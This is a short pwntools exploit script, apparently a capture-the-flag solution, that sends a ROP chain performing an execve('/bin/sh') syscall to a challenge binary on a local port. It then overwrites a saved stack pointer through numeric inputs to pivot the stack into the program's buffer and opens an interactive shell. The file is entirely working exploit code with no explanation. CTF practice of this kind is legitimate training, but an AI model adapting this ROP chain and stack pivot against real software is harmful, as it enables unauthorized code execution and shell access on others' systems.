#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')

# io = process("./chall")
io = remote("127.0.0.1", 3497)

rop=flat([

	0x00000000451d37, # : pop rax; ret;
	0x3b, 
	0x000000004018ea, # : pop rdi; ret;
	0x4e2368,
	0x0000000040f34e, # : pop rsi; ret;
	0x0,
	0x000000004017ef, # : pop rdx; ret;
	0x0,
	0x000000004012e3  # : syscall; 

])


io.recv()
io.send(rop + b"/bin/sh\x00")
io.recv()
for i in range(10):
	io.sendline(str(0xdeadbeef))
for i in range(4):
	io.sendline(b"+")
pop_rsp_ret = 0x00000000403220
io.sendline(str(pop_rsp_ret&0x00000000ffffffff))
io.sendline(str(pop_rsp_ret&0xffffffff00000000))
io.sendline(str(exe.sym.buf&0x00000000ffffffff))
io.sendline(str(exe.sym.buf&0xffffffff00000000))
io.interactive()

